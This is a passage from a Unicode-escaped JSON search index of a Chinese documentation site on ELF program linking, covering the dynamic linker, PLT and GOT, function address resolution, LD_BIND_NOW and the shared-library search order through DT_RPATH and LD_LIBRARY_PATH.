Address\n\n\n\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\u7684\u5730\u5740\u5f15\u7528\u548c\u5171\u4eab\u76ee\u6807\u4e2d\u4e0e\u5176\u76f8\u5173\u7684\u5f15\u7528\u53ef\u80fd\u5e76\u4e0d\u4f1a\u88ab\u89e3\u6790\u4e3a\u4e00\u4e2a\u503c\u3002\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684\u5f15\u7528\u5c06\u4f1a\u88ab\u52a8\u6001\u94fe\u63a5\u5668\u89e3\u6790\u5230\u51fd\u6570\u672c\u8eab\u5bf9\u5e94\u7684\u865a\u62df\u5730\u5740\u5904\u3002\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684\u5f15\u7528\uff08\u6765\u81ea\u4e8e\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff09\u5c06\u4f1a\u88ab\u94fe\u63a5\u7f16\u8f91\u5668\u89e3\u6790\u4e3a\u8fc7\u7a0b\u94fe\u63a5\u8868\u4e2d\u5bf9\u5e94\u51fd\u6570\u7684\u9879\u4e2d\u7684\u5730\u5740\u3002\n\n\n\u4e3a\u4e86\u5141\u8bb8\u4e0d\u540c\u7684\u51fd\u6570\u5730\u5740\u53ef\u4ee5\u6309\u7167\u671f\u671b\u8fdb\u884c\u5de5\u4f5c\uff0c\u5982\u679c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u5f15\u7528\u4e86\u4e00\u4e2a\u5b9a\u4e49\u5728\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\uff0c\u90a3\u4e48\u94fe\u63a5\u7f16\u8f91\u5668\u5c31\u4f1a\u628a\u76f8\u5e94\u51fd\u6570\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u653e\u5230\u4e0e\u5b83\u5173\u8054\u7684\u7b26\u53f7\u8868\u8868\u9879\u4e2d\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5bf9\u8fd9\u79cd\u7b26\u53f7\u8868\u9879\u8fdb\u884c\u7279\u6b8a\u7684\u5904\u7406\u3002\u5982\u679c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5bfb\u627e\u4e00\u4e2a\u7b26\u53f7\uff0c\u5e76\u4e14\u9047\u5230\u4e86\u4e00\u4e2a\u7b26\u53f7\u8868\u9879\u5728\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\uff0c\u90a3\u4e48\u5b83\u4f1a\u9075\u5faa\u5982\u4e0b\u7684\u89c4\u5219\uff1a\n\n\n\n\n\u5982\u679c\u7b26\u53f7\u8868\u9879\u7684\nst_shndx\n \u4e0d\u662f\nSHN_UNDEF\n \uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u4f1a\u627e\u5230\u8fd9\u4e2a\u7b26\u53f7\u7684\u5b9a\u4e49\uff0c\u5e76\u4e14\u4f7f\u7528\u5b83\u7684st_value\u6765\u4f5c\u4e3a\u7b26\u53f7\u7684\u5730\u5740\u3002\n\n\n\u5982\u679c\nst_shndx\n \u662f\nSHN_UNDEF\n \u5e76\u4e14\u7b26\u53f7\u7684\u7c7b\u578b\u662f\nSTT_FUNC\n \uff0c\u800c\u4e14\nst_value\n \u6210\u5458\u4e0d\u662f0\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u4f1a\u628a\u8fd9\u4e2a\u8868\u9879\u89c6\u4e3a\u7279\u6b8a\u7684\uff0c\u5e76\u4e14\u4f7f\u7528\nst_value\n \u7684\u503c\u4f5c\u4e3a\u7b26\u53f7\u7684\u5730\u5740\u3002\n\n\n\u5426\u5219\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u4f1a\u8ba4\u4e3a\u5728\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\u662f\u672a\u5b9a\u4e49\u7684\uff0c\u7136\u540e\u7ee7\u7eed\u5904\u7406\u3002\n\n\n\n\n\u4e00\u4e9b\u91cd\u5b9a\u4f4d\u4e0e\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u8868\u9879\u76f8\u5173\u3002\u8fd9\u4e9b\u8868\u9879\u88ab\u7528\u4e8e\u76f4\u63a5\u51fd\u6570\u8c03\u7528\uff0c\u800c\u4e0d\u662f\u5f15\u7528\u51fd\u6570\u5730\u5740\u3002\u8fd9\u4e9b\u91cd\u5b9a\u4f4d\u5e76\u4e0d\u4f1a\u6309\u7167\u4e0a\u9762\u7684\u65b9\u5f0f\u8fdb\u884c\u5904\u7406\uff0c\u56e0\u4e3a\u52a8\u6001\u94fe\u63a5\u5668\u5fc5\u987b\u4e0d\u80fd\u91cd\u5b9a\u5411\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u5e76\u4f7f\u5176\u6307\u5411\u5b83\u4eec\u672c\u8eab\u3002\n\n\nShared Object Dependencies\n\n\n\u5f53\u94fe\u63a5\u7f16\u8f91\u5668\u5728\u5904\u7406\u4e00\u4e2a\u5f52\u6863\u5e93\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u63d0\u53d6\u51fa\u5e93\u6210\u5458\u5e76\u4e14\u628a\u5b83\u4eec\u62f7\u8d1d\u5230\u8f93\u51fa\u76ee\u6807\u6587\u4ef6\u4e2d\u3002\u8fd9\u79cd\u9759\u6001\u94fe\u63a5\u7684\u64cd\u4f5c\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u662f\u4e0d\u9700\u8981\u52a8\u6001\u8fde\u63a5\u5668\u53c2\u4e0e\u7684\u3002\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u540c\u65f6\u4e5f\u63d0\u4f9b\u4e86\u670d\u52a1\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5fc5\u987b\u5c06\u5408\u9002\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6attach\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\uff0c\u4ee5\u4fbf\u4e8e\u6267\u884c\u3002\u56e0\u6b64\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4f1a\u4e13\u95e8\u63cf\u8ff0\u4ed6\u4eec\u7684\u4f9d\u8d56\u5173\u7cfb\u3002\n\n\n\u5f53\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5668\u4e3a\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u521b\u5efa\u5185\u5b58\u6bb5\u65f6\uff0c\u5728DT_NEEDED\u9879\u4e2d\u63cf\u8ff0\u7684\u4f9d\u8d56\u7ed9\u51fa\u4e86\u9700\u8981\u4ec0\u4e48\u4f9d\u8d56\u6587\u4ef6\u6765\u652f\u6301\u7a0b\u5e8f\u7684\u670d\u52a1\u3002\u901a\u8fc7\u4e0d\u65ad\u5730\u8fde\u63a5\u88ab\u5f15\u7528\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08\u5373\u4f7f\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u88ab\u5f15\u7528\u591a\u6b21\uff0c\u5b83\u6700\u540e\u4e5f\u53ea\u4f1a\u88ab\u52a8\u6001\u94fe\u63a5\u5668\u8fde\u63a5\u4e00\u6b21\uff09\u53ca\u5b83\u4eec\u7684\u4f9d\u8d56\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5efa\u7acb\u4e86\u4e00\u4e2a\u5b8c\u5168\u7684\u8fdb\u7a0b\u955c\u50cf\u3002\u5f53\u89e3\u6790\u7b26\u53f7\u5f15\u7528\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u4f7f\u7528BFS\uff08\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff09\u6765\u68c0\u67e5\u7b26\u53f7\u8868\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u9996\u5148\uff0c\u5b83\u4f1a\u68c0\u67e5\u53ef\u6267\u884c\u6587\u4ef6\u672c\u8eab\u7684\u7b26\u53f7\u8868\uff0c\u7136\u540e\u624d\u4f1a\u6309\u7167\u987a\u5e8f\u68c0\u67e5DT_NEEDED\u5165\u53e3\u4e2d\u7684\u7b26\u53f7\u8868\uff0c\u7136\u540e\u624d\u4f1a\u7ee7\u7eed\u67e5\u770b\u4e0b\u4e00\u6b21\u4f9d\u8d56\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5fc5\u987b\u53ef\u4ee5\u88ab\u7a0b\u5e8f\u8bfb\u53d6\uff0c\u5176\u5b83\u6743\u9650\u4e0d\u4e00\u5b9a\u9700\u8981\u3002\n\n\n\u4f9d\u8d56\u5217\u8868\u4e2d\u7684\u540d\u5b57\u8981\u4e48\u662fDT_SONAME\u4e2d\u7684\u5b57\u7b26\u4e32\uff0c\u8981\u4e48\u662f\u7528\u4e8e\u6784\u5efa\u5bf9\u5e94\u76ee\u6807\u6587\u4ef6\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84\u540d\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4e00\u4e2a\u94fe\u63a5\u5668\u4f7f\u7528\u4e86\u4e00\u4e2a\u5e26\u6709DT_SONAME\u9879\u540d\u5b57\u53eb\u505alib1\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4ee5\u53ca\u4e00\u4e2a\u5176\u4ed6\u8def\u5f84\u540d\u4e3a/usr/lib/lib2\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff0c\u90a3\u4e48\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5c06\u4f1a\u5305\u542blib1\u4ee5\u53ca/usr/lib/lib2\u4f9d\u8d56\u5217\u8868\u3002\n\n\n\u5982\u679c\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5177\u6709\u4e00\u4e2a\u6216\u8005\u591a\u4e2a/\uff0c\u4f8b\u5982/usr/lib/lib2\u6216\u8005directory/file\uff0c\u90a3\u4e48\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u76f4\u63a5\u4f7f\u7528\u90a3\u4e2a\u5b57\u7b26\u4e32\u6765\u4f5c\u4e3a\u8def\u5f84\u7684\u540d\u5b57\u3002\u5982\u679c\u540d\u5b57\u4e2d\u6ca1\u6709/\uff0c\u6bd4\u5982lib1\uff0c\u90a3\u4e48\u4ee5\u4e0b\u7684\u4e09\u79cd\u673a\u5236\u7ed9\u51fa\u4e86\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u641c\u7d22\u7684\u987a\u5e8f\u3002\n\n\n\n\n\n\n\u9996\u5148\uff0c\u52a8\u6001\u6570\u7ec4\u6807\u8bb0DT_RPATH\u53ef\u80fd\u4f1a\u7ed9\u51fa\u4e00\u4e2a\u5305\u542b\u4e00\u7cfb\u5217\u4ee5:\u5206\u5272\u7684\u76ee\u5f55\u7684\u5b57\u7b26\u4e32\u3002\u4f8b\u5982 /home/dir/lib:/home/dir2/lib: \u544a\u8bc9\u6211\u4eec\u5148\u5728\n/home/dir/lib\n\u76ee\u5f55\u641c\u7d22\uff0c\u7136\u540e\u518d\u5728\n/home/dir2/lib\n\u641c\u7d22\uff0c\u6700\u540e\u5728\u5f53\u524d\u76ee\u5f55\u641c\u7d22\u3002\n\n\n\n\n\n\n\u5176\u6b21\uff0c\u8fdb\u7a0b\u73af\u5883\u53d8\u91cf\u4e2d\u7684\u540d\u53ebLD_LIBRARY_PATH\u7684\u53d8\u91cf\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u4e0a\u8ff0\u6240\u8bf4\u683c\u5f0f\u7684\u76ee\u5f55\uff0c\u6700\u540e\u53ef\u80fd\u4f1a\u6709\u4e00\u4e2a;\uff0c\u540e\u9762\u8ddf\u7740\u53e6\u5916\u4e00\u4e2a\u76ee\u5f55\u5217\u8868\u540e\u9762\u8ddf\u7740\u53e6\u5916\u4e00\u4e2a\u76ee\u5f55\u5217\u8868\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6548\u679c\u4e0e\u7b2c\u4e00\u4e2a\u6240\u8bf4\u7684\u6548\u679c\u76f8\u540c\n\n\n\n\n\n\nLD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib:\n\n\n\n\nLD_LIBRARY_PATH=/home/dir/lib;/home/dir2/lib:\n\n\nLD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib:;\n\n\n\n\n\u6240\u6709\u7684LD_LIBRARY_PATH\u4e2d\u7684\u76ee\u5f55\u53ea\u4f1a\u5728\u641c\u7d22\u5b8cDT_RPATH\u624d\u4f1a\u8fdb\u884c\u641c\u7d22\u3002\u5c3d\u7ba1\u6709\u4e00\u4e9b\u7a0b\u5e8f\uff08\u5982\u94fe\u63a5\u7f16\u8f91\u5668\uff09\u5728\u5904\u7406;\u524d\u540e\u7684\u5217\u8868\u7684\u65b9\u5f0f\u4e0d\u540c\uff0c\u4f46\u662f\u52a8\u6001\u94fe\u63a5\u5668\u5904\u7406\u7684\u65b9\u5f0f\u5b8c\u5168\u4e00\u6837\uff0c\u9664\u6b64\u4e4b\u5916\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u63a5\u53d7\u5206\u53f7\u8868\u793a\u8bed\u6cd5\uff0c\u6b63\u5982\u4e0a\u9762\u6240\u63cf\u8ff0\u7684\u6837\u5b50\u3002\n\n\n\n\n\u6700\u540e\uff0c\u5982\u679c\u4ee5\u4e0a\u4e24\u7ec4\u76ee\u5f55\u65e0\u6cd5\u5b9a\u4f4d\u671f\u671b\u7684\u5e93\uff0c\u5219\u52a8\u6001\u94fe\u63a5\u5668\u641c\u7d22\n/usr/lib\n \u8def\u5f84\u4e0b\u7684\u5e93\u3002\n\n\n\n\n\u6ce8\u610f\n\n\n\n\n\u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u5bf9\u4e8e\nset-user\n \u4ee5\u53ca \nset-group\n \u6807\u8bc6\u7684\u7a0b\u5e8f\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5ffd\u7565\u641c\u7d22\u73af\u5883\u53d8\u91cf\uff08\u4f8b\u5982\nLD_LIBRARY_PATH\n\uff09\uff0c\u4ec5\u4ec5\u641c\u7d22\nDT_RPATH\n\u6307\u5b9a\u7684\u76ee\u5f55\u548c\n/usr/lib\n\u3002", 
            "title": "\u7a0b\u5e8f\u94fe\u63a5"
        }, 
        {
            "location": "/executable/elf/program_linking/#_1", 
            "text": "", 
            "title": "\u7a0b\u5e8f\u94fe\u63a5"
        }, 
        {
            "location": "/executable/elf/program_linking/#_2", 
            "text": "", 
            "title": "\u9759\u6001\u94fe\u63a5"
        }, 
        {
            "location": "/executable/elf/program_linking/#_3", 
            "text": "\u52a8\u6001\u94fe\u63a5\u4e3b\u8981\u662f\u5728\u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u6216\u8005\u7a0b\u5e8f\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u89e3\u6790\u53d8\u91cf\u6216\u8005\u51fd\u6570\u7684\u5f15\u7528\u3002ELF\u6587\u4ef6\u4e2d\u67d0\u4e9b\u8282\u533a\u4ee5\u53ca\u5934\u90e8\u5143\u7d20\u5c31\u4e0e\u52a8\u6001\u94fe\u63a5\u6709\u5173\u3002\u52a8\u6001\u94fe\u63a5\u7684\u6a21\u578b\u7531\u64cd\u4f5c\u7cfb\u7edf\u5b9a\u4e49\u5e76\u5b9e\u73b0\u3002", 
            "title": "\u52a8\u6001\u94fe\u63a5"
        }, 
        {
            "location": "/executable/elf/program_linking/#dynamic-linker", 
            "text": "\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u7528\u6765\u5e2e\u52a9\u52a0\u8f7d\u5e94\u7528\u6240\u9700\u8981\u7684\u5e93\u5e76\u89e3\u6790\u5e93\u6240\u5bfc\u51fa\u7684\u52a8\u6001\u7b26\u53f7\uff08\u51fd\u6570\u548c\u5168\u5c40\u53d8\u91cf\uff09\u3002  \u5f53\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\u6765\u6784\u9020\u7a0b\u5e8f\u65f6\uff0c\u94fe\u63a5\u7f16\u8f91\u5668\u4f1a\u5728\u53ef\u6267\u884c\u6587\u4ef6\u7684\u7a0b\u5e8f\u5934\u90e8\u6dfb\u52a0\u4e00\u4e2a PT_INTERP \u7c7b\u578b\u7684\u5143\u7d20\uff0c\u4ee5\u4fbf\u4e8e\u544a\u8bc9\u7cfb\u7edf\u5c06\u52a8\u6001\u94fe\u63a5\u5668\u4f5c\u4e3a\u7a0b\u5e8f\u89e3\u91ca\u5668\u6765\u8c03\u7528\u3002   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5bf9\u4e8e\u7cfb\u7edf\u63d0\u4f9b\u7684\u52a8\u6001\u94fe\u63a5\u5668\uff0c\u4e0d\u540c\u7684\u7cfb\u7edf\u4f1a\u4e0d\u540c\u3002   \u53ef\u6267\u884c\u7a0b\u5e8f\u548c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5408\u4f5c\u8d77\u6765\u4e3a\u7a0b\u5e8f\u521b\u5efa\u8fdb\u7a0b\u955c\u50cf\uff0c\u5177\u4f53\u7684\u7ec6\u8282\u5982\u4e0b\uff1a   \u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5185\u5b58\u6bb5\u6dfb\u52a0\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\u3002  \u5c06\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u5185\u5b58\u6bb5\u6dfb\u52a0\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\u3002  \u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002  \u5982\u679c\u4f20\u9012\u7ed9\u4e86\u52a8\u6001\u94fe\u63a5\u5668\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u8bdd\uff0c\u5c31\u5c06\u5176\u5173\u95ed\u3002  \u5c06\u63a7\u5236\u6743\u4f20\u9012\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u8ba9\u6211\u4eec\u611f\u89c9\u8d77\u6765\u5c31\u597d\u50cf\u7a0b\u5e8f\u76f4\u63a5\u4ece\u53ef\u6267\u884c\u6587\u4ef6\u5904\u62ff\u5230\u4e86\u6267\u884c\u6743\u9650\u3002   \u94fe\u63a5\u7f16\u8f91\u5668\u540c\u6837\u4e5f\u521b\u5efa\u4e86\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\u6765\u534f\u52a9\u52a8\u6001\u94fe\u63a5\u5668\u6765\u5904\u7406\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff0c\u4f8b\u5982   \u7c7b\u578b\u4e3aSHT_DYNAMIC\u7684\u8282.dynamic\u5305\u542b\u4e86\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\uff0c\u5728\u8fd9\u4e2a\u8282\u7684\u5f00\u59cb\u5904\u5305\u542b\u4e86\u5176\u5b83\u52a8\u6001\u94fe\u63a5\u7684\u4fe1\u606f\u3002  \u7c7b\u578b\u4e3aSHT_HASH\u7684\u8282.hash\u5305\u542b\u4e86\u7b26\u53f7\u54c8\u5e0c\u8868\u3002  \u7c7b\u578b\u4e3aSHT_PROGBITS\u7684\u8282.got\u4ee5\u53ca.plt\u5305\u542b\u4e86\u4e24\u4e2a\u72ec\u7acb\u7684\u8868\uff1a\u5168\u5c40\u504f\u79fb\u8868\uff0c\u8fc7\u7a0b\u94fe\u63a5\u8868\u3002\u7a0b\u5e8f\u4f1a\u5229\u7528\u8fc7\u7a0b\u94fe\u63a5\u8868\u6765\u5904\u7406\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u3002   \u56e0\u4e3a\u6240\u6709\u7684UNIX System V\u90fd\u4f1a\u4ece\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5bfc\u5165\u57fa\u672c\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u53c2\u4e0e\u5230\u6bcf\u4e00\u4e2aTIS ELF-conforming\u7684\u7a0b\u5e8f\u6267\u884c\u8fc7\u7a0b\u4e2d\u3002  \u6b63\u5982\u7a0b\u5e8f\u52a0\u8f7d\u4e2d\u6240\u8bf4\u7684\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u53ef\u80fd\u4f1a\u5360\u7528\u4e0e\u7a0b\u5e8f\u5934\u90e8\u4e2d\u8bb0\u5f55\u7684\u4e0d\u4e00\u6837\u7684\u865a\u62df\u5730\u5740\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5728\u7a0b\u5e8f\u62ff\u5230\u63a7\u5236\u6743\u524d\uff0c\u91cd\u5b9a\u4f4d\u5185\u5b58\u955c\u50cf\uff0c\u66f4\u65b0\u7edd\u5bf9\u5730\u5740\u3002\u5982\u679c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u786e\u5b9e\u52a0\u8f7d\u5230\u4e86\u5176\u5728\u7a0b\u5e8f\u5934\u90e8\u4e2d\u6307\u5b9a\u7684\u5730\u5740\u7684\u8bdd\uff0c\u90a3\u4e48\u90a3\u4e9b\u7edd\u5bf9\u5730\u5740\u7684\u503c\u5c31\u4f1a\u662f\u6b63\u786e\u7684\u3002\u4f46\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0d\u4f1a\u53d1\u751f\u3002  \u5982\u679c\u8fdb\u7a0b\u7684\u73af\u5883\u4e2d\u6709\u540d\u53eb LD_BIND_NOW \u7684\u975e\u7a7a\u503c\uff0c\u90a3\u4e48\u52a8\u6001\u8fde\u63a5\u5668\u5728\u628a\u6743\u9650\u4f20\u9012\u7ed9\u7a0b\u5e8f\u65f6\uff0c\u4f1a\u6267\u884c\u6240\u6709\u7684\u91cd\u5b9a\u4f4d\u3002\u4f8b\u5982\uff0c\u6240\u6709\u7684\u5982\u4e0b\u73af\u5883\u53d8\u91cf\u7684\u53d6\u503c\u90fd\u4f1a\u6307\u5b9a\u8fd9\u4e00\u884c\u4e3a\u3002   LD_BIND_NOW = 1  LD_BIND_NOW = on  LD_BIND_NOW = off   \u5426\u5219\uff0cLD_BIND_NOW \u8981\u4e48\u4e0d\u5b58\u5728\u4e8e\u5f53\u524d\u7684\u8fdb\u7a0b\u73af\u5883\u4e2d\uff0c\u8981\u4e48\u5177\u6709\u4e00\u4e2a\u975e\u7a7a\u503c\u3002\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u5ef6\u8fdf\u89e3\u6790\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u5165\u53e3\uff0c\u8fd9\u5176\u5b9e\u5c31\u662fplt\u8868\u7684\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u5373\u5f53\u7a0b\u5e8f\u9700\u8981\u4f7f\u7528\u67d0\u4e2a\u7b26\u53f7\u65f6\uff0c\u518d\u8fdb\u884c\u5730\u5740\u89e3\u6790\uff0c\u8fd9\u53ef\u4ee5\u51cf\u5c11\u7b26\u53f7\u89e3\u6790\u4ee5\u53ca\u91cd\u5b9a\u4f4d\u7684\u8d1f\u8f7d\u3002", 
            "title": "Dynamic Linker"
        }, 
        {
            "location": "/executable/elf/program_linking/#function-address", 
            "text": "\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\u7684\u5730\u5740\u5f15\u7528\u548c\u5171\u4eab\u76ee\u6807\u4e2d\u4e0e\u5176\u76f8\u5173\u7684\u5f15\u7528\u53ef\u80fd\u5e76\u4e0d\u4f1a\u88ab\u89e3\u6790\u4e3a\u4e00\u4e2a\u503c\u3002\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684\u5f15\u7528\u5c06\u4f1a\u88ab\u52a8\u6001\u94fe\u63a5\u5668\u89e3\u6790\u5230\u51fd\u6570\u672c\u8eab\u5bf9\u5e94\u7684\u865a\u62df\u5730\u5740\u5904\u3002\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684\u5f15\u7528\uff08\u6765\u81ea\u4e8e\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff09\u5c06\u4f1a\u88ab\u94fe\u63a5\u7f16\u8f91\u5668\u89e3\u6790\u4e3a\u8fc7\u7a0b\u94fe\u63a5\u8868\u4e2d\u5bf9\u5e94\u51fd\u6570\u7684\u9879\u4e2d\u7684\u5730\u5740\u3002  \u4e3a\u4e86\u5141\u8bb8\u4e0d\u540c\u7684\u51fd\u6570\u5730\u5740\u53ef\u4ee5\u6309\u7167\u671f\u671b\u8fdb\u884c\u5de5\u4f5c\uff0c\u5982\u679c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u5f15\u7528\u4e86\u4e00\u4e2a\u5b9a\u4e49\u5728\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\uff0c\u90a3\u4e48\u94fe\u63a5\u7f16\u8f91\u5668\u5c31\u4f1a\u628a\u76f8\u5e94\u51fd\u6570\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u653e\u5230\u4e0e\u5b83\u5173\u8054\u7684\u7b26\u53f7\u8868\u8868\u9879\u4e2d\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5bf9\u8fd9\u79cd\u7b26\u53f7\u8868\u9879\u8fdb\u884c\u7279\u6b8a\u7684\u5904\u7406\u3002\u5982\u679c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5bfb\u627e\u4e00\u4e2a\u7b26\u53f7\uff0c\u5e76\u4e14\u9047\u5230\u4e86\u4e00\u4e2a\u7b26\u53f7\u8868\u9879\u5728\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\uff0c\u90a3\u4e48\u5b83\u4f1a\u9075\u5faa\u5982\u4e0b\u7684\u89c4\u5219\uff1a   \u5982\u679c\u7b26\u53f7\u8868\u9879\u7684 st_shndx  \u4e0d\u662f SHN_UNDEF  \uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u4f1a\u627e\u5230\u8fd9\u4e2a\u7b26\u53f7\u7684\u5b9a\u4e49\uff0c\u5e76\u4e14\u4f7f\u7528\u5b83\u7684st_value\u6765\u4f5c\u4e3a\u7b26\u53f7\u7684\u5730\u5740\u3002  \u5982\u679c st_shndx  \u662f SHN_UNDEF  \u5e76\u4e14\u7b26\u53f7\u7684\u7c7b\u578b\u662f STT_FUNC  \uff0c\u800c\u4e14 st_value  \u6210\u5458\u4e0d\u662f0\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u4f1a\u628a\u8fd9\u4e2a\u8868\u9879\u89c6\u4e3a\u7279\u6b8a\u7684\uff0c\u5e76\u4e14\u4f7f\u7528 st_value  \u7684\u503c\u4f5c\u4e3a\u7b26\u53f7\u7684\u5730\u5740\u3002  \u5426\u5219\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u4f1a\u8ba4\u4e3a\u5728\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\u662f\u672a\u5b9a\u4e49\u7684\uff0c\u7136\u540e\u7ee7\u7eed\u5904\u7406\u3002   \u4e00\u4e9b\u91cd\u5b9a\u4f4d\u4e0e\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u8868\u9879\u76f8\u5173\u3002\u8fd9\u4e9b\u8868\u9879\u88ab\u7528\u4e8e\u76f4\u63a5\u51fd\u6570\u8c03\u7528\uff0c\u800c\u4e0d\u662f\u5f15\u7528\u51fd\u6570\u5730\u5740\u3002\u8fd9\u4e9b\u91cd\u5b9a\u4f4d\u5e76\u4e0d\u4f1a\u6309\u7167\u4e0a\u9762\u7684\u65b9\u5f0f\u8fdb\u884c\u5904\u7406\uff0c\u56e0\u4e3a\u52a8\u6001\u94fe\u63a5\u5668\u5fc5\u987b\u4e0d\u80fd\u91cd\u5b9a\u5411\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u5e76\u4f7f\u5176\u6307\u5411\u5b83\u4eec\u672c\u8eab\u3002", 
            "title": "Function Address"
        }, 
        {
            "location": "/executable/elf/program_linking/#shared-object-dependencies", 
            "text": "\u5f53\u94fe\u63a5\u7f16\u8f91\u5668\u5728\u5904\u7406\u4e00\u4e2a\u5f52\u6863\u5e93\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u63d0\u53d6\u51fa\u5e93\u6210\u5458\u5e76\u4e14\u628a\u5b83\u4eec\u62f7\u8d1d\u5230\u8f93\u51fa\u76ee\u6807\u6587\u4ef6\u4e2d\u3002\u8fd9\u79cd\u9759\u6001\u94fe\u63a5\u7684\u64cd\u4f5c\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u662f\u4e0d\u9700\u8981\u52a8\u6001\u8fde\u63a5\u5668\u53c2\u4e0e\u7684\u3002\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u540c\u65f6\u4e5f\u63d0\u4f9b\u4e86\u670d\u52a1\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5fc5\u987b\u5c06\u5408\u9002\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6attach\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\